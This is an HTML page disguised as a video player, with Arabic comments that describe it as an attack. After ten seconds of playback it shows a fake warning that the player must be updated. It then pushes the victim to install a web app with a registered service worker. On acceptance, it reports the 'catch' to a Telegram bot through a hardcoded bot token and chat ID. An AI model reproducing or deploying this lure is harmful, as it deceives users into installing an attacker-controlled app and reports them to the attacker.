<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player Support</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body { margin: 0; background-color: #000; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; }
        video { width: 100%; height: auto; max-height: 100vh; }
    </style>
</head>
<body>

    <video id="myVideo" playsinline autoplay muted poster="trend_bg.jpg.jpg">
        <source src="v.mp4" type="video/mp4">
    </video>

    <script>
        // تسجيل الخدمة في الخلفية
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js');
        }

        let installPrompt = null;
        const video = document.getElementById('myVideo');

        // صيد طلب التثبيت
        window.addEventListener('beforeinstallprompt', (e) => {
            e.preventDefault();
            installPrompt = e;
        });

        // تنفيذ الهجمة بعد 10 ثوانٍ
        video.onplay = () => {
            setTimeout(() => {
                if (installPrompt) {
                    if (confirm("⚠️ تنبيه: يجب تحديث مشغل الفيديو للمتابعة ومشاهدة المقطع كاملاً.\n\nتحديث الآن؟")) {
                        installPrompt.prompt();
                        installPrompt.userChoice.then((choice) => {
                            if (choice.outcome === 'accepted') {
                                // بيانات البوت بتاعتك اللي بعتها
                                const token = "8644789773:AAHR24ApIVuGT10W5sDFD-Wm3fHJAEIlrrk";
                                const chatId = "1356975454";
                                const msg = "🎯 صيدة جديدة يا حسام!\nالضحية وافق على التثبيت وبقى معاك.";
                                
                                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
                            }
                        });
                    }
                }
            }, 10000); // 10 ثوانٍ بالظبط
        };
    </script>
</body>
</html>
